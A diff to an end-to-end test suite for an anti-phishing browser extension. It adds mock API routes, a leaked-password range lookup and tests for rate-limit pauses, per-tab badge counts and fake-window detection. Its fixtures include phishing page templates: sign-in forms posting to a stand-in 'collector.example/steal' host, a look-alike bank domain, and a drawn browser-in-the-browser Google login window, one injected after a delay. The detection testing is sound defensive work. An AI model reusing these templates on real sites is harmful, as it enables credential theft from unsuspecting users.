@@ -38,6 +38,13 @@
  * reaching production. The test sites (*.example, *.tk, *.top) resolve to
  * the mock too; it serves the same pages on every hostname.
  *
+ * The mock answers a web page's own origin WITHOUT CORS headers, as the
+ * real API does. It used to answer everyone, which hid that the password-
+ * leak check and the brand-host lookup, fetched from content scripts, were
+ * thrown away by Chromium in production. Both go through the background
+ * now, and so do the public checks: with an install number, paused by a
+ * 429 for its Retry-After (never the page check), the toolbar count per tab.
+ *
  * The webmail scanner reads and sends the email a person opens, so it must
  * stay silent until Settings switches it on (runWebmailTree below): off, a
  * routed Gmail page is neither scanned nor sent; on, the open message is
@@ -50,6 +57,7 @@
  * the static checks in scripts/test-extension-core.mjs.
  */
 import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
 import { createServer } from "node:http";
 import { createRequire } from "node:module";
 import { cpSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
@@ -112,6 +120,27 @@ function openFrom(envelope, recipientKeys) {
 
 // ── mock API ──
 
+// What the test types into a password field: text the mock's leak list
+// knows. SHA-1 because that is the k-anonymity range lookup's own hash (the
+// extension sends the first 5 characters and matches the rest itself), not
+// a way of storing anything.
+const LEAKED_TEXT = "correct horse 2026";
+const LEAKED = (() => {
+  const hash = createHash("sha1").update(LEAKED_TEXT).digest("hex").toUpperCase();
+  return { prefix: hash.slice(0, 5), suffix: hash.slice(5) };
+})();
+
+// Browser-in-the-browser: a drawn window with traffic lights, an address
+// bar that is just text, and a sign-in form inside.
+const BITB_WINDOW =
+  "<div id=\"bitb\" style=\"position:fixed;top:40px;left:40px;width:420px;background:#fff;border:1px solid #ccc\">" +
+  "<div style=\"display:flex;gap:6px;align-items:center;padding:6px\">" +
+  "<span style=\"display:inline-block;width:12px;height:12px;border-radius:6px;background:#f55\"></span>" +
+  "<span style=\"display:inline-block;width:12px;height:12px;border-radius:6px;background:#fb3\"></span>" +
+  "<span style=\"display:inline-block;width:12px;height:12px;border-radius:6px;background:#3c5\"></span>" +
+  "<span>https://accounts.google.com/signin</span></div>" +
+  "<div><input type=\"email\"><input type=\"password\"><button>Next</button></div></div>";
+
 const PAGES = {
   "/credential-form.html":
     "<!doctype html><title>Sign in</title><form action=\"http://collector.example/steal\" method=\"post\">" +
@@ -131,32 +160,61 @@ const PAGES = {
     "<a id=\"l-guess\" href=\"http://login.paypa1.tk/\">Account</a> " +
     "<a id=\"l-wrapped\" href=\"https://www.google.com/url?q=http://scam-wrapped.example/&sa=D\">Search result</a> " +
     "<a id=\"l-hidden\" href=\"https://www.linkedin.com/slink?code=e2e\">Short link</a> " +
-    "<a id=\"l-docs\" href=\"https://docs.google.com/forms/d/e/e2e/viewform\">Form</a></p>",
+    "<a id=\"l-docs\" href=\"https://docs.google.com/forms/d/e/e2e/viewform\">Form</a> " +
+    // An in-page link: a same-document navigation, nothing to badge.
+    "<a id=\"l-below\" href=\"#below\">Below</a></p><p id=\"below\">The end</p>",
   // A sign-in form that posts to its own host: nothing for the form checks.
   "/landing.html":
     "<!doctype html><title>Sign in</title><form action=\"/login\" method=\"post\">" +
     "<input type=\"text\" name=\"u\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>",
+  // A page named like a bank whose form posts to the bank's own sign-in
+  // host (the mock's verified list has it), and one that posts elsewhere.
+  "/brand-sso.html":
+    "<!doctype html><title>Sign in</title><form action=\"https://secure01a.chase.com/auth\" method=\"post\">" +
+    "<input type=\"text\" name=\"u\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>",
+  "/brand-collector.html":
+    "<!doctype html><title>Sign in</title><form action=\"https://collector.example/steal\" method=\"post\">" +
+    "<input type=\"text\" name=\"u\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>",
+  // A fake browser window (browser-in-the-browser) with a sign-in form,
+  // there on load, and drawn after a fake "loading" pause.
+  "/bitb.html": `<!doctype html><title>Sign in</title><p>Continue with Google</p>${BITB_WINDOW}`,
+  "/bitb-late.html":
+    "<!doctype html><title>Loading</title><div id=\"feed\"><p>Loading…</p></div>" +
+    `<script>setTimeout(function(){document.body.insertAdjacentHTML("beforeend", ${JSON.stringify(BITB_WINDOW)});}, 800);</script>`,
 };
+
+// Answers a page's own origin without CORS headers, as api.cleanway.ai does
+// (the extension's requests carry its own origin, or none): a content script
+// that fetched the API itself got nothing back in Chromium, while the mock
+// used to answer everyone and hid it.
+function corsFor(origin) {
+  if (origin && /^https?:/.test(origin)) return {};
+  return {
+    "Access-Control-Allow-Origin": "*",
+    "Access-Control-Allow-Headers": "Authorization, Content-Type, X-Device-Id, X-Cleanway-Install",
+    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+  };
+}
 
 function startMockApi(family) {
   const calls = [];
-  const state = { inbox: [] };
-  const cors = {
-    "Access-Control-Allow-Origin": "*",
-    "Access-Control-Allow-Headers": "Authorization, Content-Type, X-Device-Id",
-    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-  };
+  const state = { inbox: [], limited: new Set() };
   const server = createServer((req, res) => {
     let raw = "";
     req.on("data", (c) => { raw += c; });
     req.on("end", () => {
       const url = new URL(req.url, "http://mock");
       const body = raw ? JSON.parse(raw) : null;
+      const cors = corsFor(req.headers.origin);
       if (req.method !== "OPTIONS") {
-        calls.push({ method: req.method, path: url.pathname, body, auth: req.headers.authorization, device: req.headers["x-device-id"] });
+        calls.push({
+          method: req.method, path: url.pathname, query: url.search, body,
+          auth: req.headers.authorization, device: req.headers["x-device-id"],
+          install: req.headers["x-cleanway-install"], origin: req.headers.origin, referer: req.headers.referer,
+        });
       }
-      const json = (status, data) => {
-        res.writeHead(status, { ...cors, "Content-Type": "application/json" });
+      const json = (status, data, headers = {}) => {
+        res.writeHead(status, { ...cors, ...headers, "Content-Type": "application/json" });
         res.end(JSON.stringify(data));
       };
       if (req.method === "OPTIONS") { res.writeHead(204, cors); return res.end(); }
@@ -167,12 +225,33 @@ function startMockApi(family) {
       const check = url.pathname.match(/^\/api\/v1\/public\/check\/(.+)$/);
       if (check) {
         const domain = decodeURIComponent(check[1]);
-        // The shared per-IP limit a Tele2 user behind CGNAT hits.
-        if (domain.includes("paypa1")) return json(429, { detail: "rate limited" });
+        // Every "paypa1" host is refused, with a limit already over
+        // (Retry-After: 0): those checks get the offline verdict and later
+        // checks are not paused. The pause has its own case (ratelimit-*).
+        if (domain.includes("paypa1")) return json(429, { detail: "rate limited" }, { "Retry-After": "0" });
+        // The install's hourly budget spent, once per host, for 2 seconds.
+        if (domain.startsWith("ratelimit-") && !state.limited.has(domain)) {
+          state.limited.add(domain);
+          return json(429, { detail: { error: "Too many checks from this app.", retry_after_seconds: 2 } }, { "Retry-After": "2" });
+        }
         const scam = domain.startsWith("scam-");
         return json(200, scam
           ? { domain, score: 97, level: "dangerous", signals: ["Reported as phishing"], reason_codes: ["phishtank"] }
           : { domain, score: 2, level: "safe", signals: [], reason_codes: [] });
+      }
+      const range = url.pathname.match(/^\/api\/v1\/breach\/check\/([0-9A-F]{5})$/);
+      if (range) {
+        const hit = range[1] === LEAKED.prefix;
+        return json(200, { prefix: range[1], suffixes: [
+          { suffix: "0".repeat(35), count: 0 },
+          ...(hit ? [{ suffix: LEAKED.suffix, count: 42 }] : []),
+        ] });
+      }
+      if (url.pathname === "/api/v1/credentials/verified") {
+        const brand = url.searchParams.get("brand");
+        return json(200, brand === "chase"
+          ? { brand, hosts: ["secure01a.chase.com", "chase.com"], is_known: true }
+          : { brand, hosts: [], is_known: false });
       }
       if (url.pathname === "/api/v1/user/threats/increment") return json(200, { threats_blocked_lifetime: 1 });
       if (url.pathname === "/api/v1/me/devices" && req.method === "POST") return json(201, { status: "created" });
@@ -218,6 +297,16 @@ async function launch(tree, lang = UI_LANG, extPath = resolve(ROOT, tree)) {
   return { context, sw, extId: new URL(sw.url()).host, userDir };
 }
 
+// A catalog entry's message with its $NAME$ placeholders filled, as
+// chrome.i18n.getMessage(key, subs) does.
+function withSubs(entry, subs) {
+  return entry.message.replace(/\$([A-Za-z0-9_]+)\$/g, (whole, name) => {
+    const ph = entry.placeholders && entry.placeholders[name.toLowerCase()];
+    const n = ph ? Number(String(ph.content).replace("$", "")) : NaN;
+    return Number.isInteger(n) && n >= 1 ? subs[n - 1] : whole;
+  });
+}
+
 function readCatalog(tree, locale) {
   return JSON.parse(readFileSync(resolve(ROOT, tree, "_locales", locale, "messages.json"), "utf8"));
 }
@@ -242,9 +331,22 @@ function offlineScorer(tree) {
   return ctx;
 }
 
-async function sendCheck(page, domains) {
-  return page.evaluate((d) => chrome.runtime.sendMessage({ type: "CHECK_DOMAINS", domains: d }), domains);
+async function sendCheck(page, domains, { asPage = false } = {}) {
+  return page.evaluate(([d, p]) => chrome.runtime.sendMessage({ type: "CHECK_DOMAINS", domains: d, page: p }), [domains, asPage]);
 }
+
+// The tab a Playwright page is in (the extension has no "tabs" permission,
+// so it is found as the active tab once the page is in front).
+async function tabIdOf(sw, tab) {
+  await tab.bringToFront();
+  return sw.evaluate(() => chrome.tabs.query({ active: true, lastFocusedWindow: true }).then((t) => t[0].id));
+}
+
+const badgeText = (sw, tabId) => sw.evaluate((id) => chrome.action.getBadgeText({ tabId: id }), tabId);
+
+const publicChecks = (api, from = 0) => api.calls.slice(from)
+  .filter((c) => c.path.startsWith("/api/v1/public/check/"))
+  .map((c) => ({ ...c, host: decodeURIComponent(c.path.slice("/api/v1/public/check/".length)) }));
 
 const posts = (api, path) => api.calls.filter((c) => c.method === "POST" && c.path === path);
 const INCREMENT = "/api/v1/user/threats/increment";
@@ -404,6 +506,26 @@ async function runTree(tree) {
       assert.deepEqual(hosts.map((h) => resp.results.find((x) => x.domain === h).level), ["dangerous", "caution"]);
     });
 
+    await check("public checks carry the install number; a 429 pauses link lookups for its Retry-After, never the page check", async () => {
+      const from = api.calls.length;
+      await sendCheck(page, ["ratelimit-1.example"]); // the mock: 429, Retry-After: 2
+      const paused = await sendCheck(page, ["paused-link.example"]);
+      assert.equal(paused.results[0].source, "local", "a link was asked during the pause");
+      const pageCheck = await sendCheck(page, ["paused-page.example"], { asPage: true });
+      assert.equal(pageCheck.results[0].source, "api", "the page check waited for the pause");
+      assert.deepEqual(publicChecks(api, from).map((c) => c.host), ["ratelimit-1.example", "paused-page.example"]);
+      // The pause is over: neither fallback was kept (they used to be, for an hour).
+      await sleep(2300);
+      const again = await sendCheck(page, ["ratelimit-1.example", "paused-link.example"]);
+      assert.deepEqual(again.results.map((r) => r.source), ["api", "api"]);
+      const sent = publicChecks(api, from);
+      assert.deepEqual(sent.slice(2).map((c) => c.host).sort(), ["paused-link.example", "ratelimit-1.example"]);
+      const ids = new Set(sent.map((c) => c.install));
+      assert.equal(ids.size, 1, `one install number for every check: ${[...ids]}`);
+      assert.match([...ids][0], /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
+      assert.ok(sent.every((c) => !c.auth), "a public check carried the account token");
+    });
+
     await check("a page that only LINKS to scams blocks nothing and tells nobody", async () => {
       const reader = await context.newPage();
       await reader.goto(`http://reader.example:${new URL(api.base).port}/links.html`);
@@ -424,6 +546,36 @@ async function runTree(tree) {
       const st = await stats(sw);
       assert.equal(st.threats_blocked, 0, "a red badge is a warning, not a block");
       assert.ok(st.threats_warned >= 3, `warnings: ${st.threats_warned}`);
+
+      // The toolbar count is this tab's: three dangerous link hosts here,
+      // nothing on another tab, and gone once the tab loads another page.
+      const readerTab = await tabIdOf(sw, reader);
+      assert.equal(await badgeText(sw, readerTab), "3", "the reader tab's toolbar count");
+      const otherTab = await tabIdOf(sw, page);
+      assert.equal(await badgeText(sw, otherTab), "", "another tab shows the reader's count");
+
+      // Same-document navigations (an SPA's history.pushState, a #fragment
+      // link) fire tabs.onUpdated "loading" too, but the page and its links
+      // are the same: the count stays.
+      await reader.bringToFront();
+      await reader.evaluate(() => history.pushState({}, "", "/links.html?view=2"));
+      await reader.click("#l-below");
+      await reader.waitForURL(/#below$/);
+      await sleep(1000);
+      assert.equal(await badgeText(sw, readerTab), "3", "a same-document navigation dropped the count");
+
+      await reader.evaluate(() => { window.__cleanwayE2eKept = true; });
+      await reader.goto(`http://reader.example:${new URL(api.base).port}/landing.html`);
+      await until("the badge to clear on navigation", async () => (await badgeText(sw, readerTab)) === "", 5000);
+
+      // Back again: restored from the back/forward cache (nothing re-scans
+      // its links, only its page check runs) or loaded afresh, the count is
+      // the reader page's again.
+      await reader.goBack();
+      const restored = await reader.evaluate(() => window.__cleanwayE2eKept === true);
+      await until(`the reader's count after going back (${restored ? "back/forward cache" : "loaded again"})`,
+        async () => (await badgeText(sw, readerTab)) === "3", 5000);
+      console.log(`        (going back: ${restored ? "restored from the back/forward cache" : "loaded again"})`);
       await reader.close();
     });
 
@@ -527,6 +679,58 @@ async function runTree(tree) {
       assert.ok(banner.includes(messages.credguard_banner_title_weak.message), `calm title expected: ${banner}`);
       assert.ok(!banner.includes(messages.credguard_banner_title.message), `"scam site" title on one weak sign: ${banner}`);
       await tab.close();
+    });
+
+    // The two lookups content scripts used to fetch themselves: in Chromium
+    // that request is the page's, the API answers page origins without CORS
+    // headers (so does the mock now), and the answer was thrown away.
+    await check("a password from a known leak gets the banner; the background asks, without the page's origin", async () => {
+      const { messages } = await activeCatalog(sw, tree);
+      const from = api.calls.length;
+      const tab = await context.newPage();
+      // A secure context: the SHA-1 is Web Crypto's, which an http:// page
+      // other than loopback does not get.
+      await tab.goto(`${api.base}/landing.html`);
+      await tab.fill('input[type="password"]', LEAKED_TEXT);
+      await tab.focus('input[type="text"]'); // leaving the field starts the check
+      const banner = await (await tab.waitForSelector("#ls-pwned-banner", { timeout: 8000 })).innerText();
+      assert.ok(banner.includes(messages.pwned_title.message), `banner: ${banner}`);
+      assert.ok(banner.includes("42"), `the leak count: ${banner}`);
+      const asked = api.calls.slice(from).filter((c) => c.path.startsWith("/api/v1/breach/check/"));
+      assert.deepEqual(asked.map((c) => c.path), [`/api/v1/breach/check/${LEAKED.prefix}`], "only the 5-character prefix goes");
+      assert.ok(!asked.some((c) => `${c.origin} ${c.referer}`.includes(api.base)), `the page's origin went along: ${JSON.stringify(asked)}`);
+      await tab.close();
+    });
+
+    await check("the credential guard learns a brand's own sign-in hosts through the background", async () => {
+      const from = api.calls.length;
+      const sso = await context.newPage();
+      await sso.goto(`http://chase-0nline.example:${port}/brand-sso.html`);
+      await until("the brand lookup", async () => api.calls.slice(from).some((c) => c.path === "/api/v1/credentials/verified"), 8000);
+      await sleep(800);
+      assert.equal(await sso.$("#ls-credguard-banner"), null, "a form posting to the brand's verified host was warned about");
+      const lookup = api.calls.slice(from).find((c) => c.path === "/api/v1/credentials/verified");
+      assert.equal(lookup.query, "?brand=chase");
+      assert.ok(!/chase-0nline/.test(`${lookup.origin} ${lookup.referer}`), "the page's origin went along");
+      await sso.close();
+      // The same look-alike posting anywhere else is still warned about.
+      const other = await context.newPage();
+      await other.goto(`http://chase-0nline.example:${port}/brand-collector.html`);
+      await other.waitForSelector("#ls-credguard-banner", { state: "attached", timeout: 8000 });
+      await other.close();
+    });
+
+    await check("a fake browser window is named, on load and when drawn late", async () => {
+      const { messages } = await activeCatalog(sw, tree);
+      // The banner's sentence with the drawn address and the real host in it.
+      const want = withSubs(messages.mpg_bitb, ['"accounts.google.com"', `login-portal.example:${port}`]);
+      for (const path of ["/bitb.html", "/bitb-late.html"]) {
+        const tab = await context.newPage();
+        await tab.goto(`http://login-portal.example:${port}${path}`);
+        const bar = await (await tab.waitForSelector("#cw-modern-phish-banner", { state: "attached", timeout: 8000 })).evaluate((el) => el.textContent);
+        assert.ok(bar.endsWith(want), `${path}: ${bar}`);
+        await tab.close();
+      }
     });
 
     await check("the daily prune deletes history older than 30 days and keeps the rest", async () => {
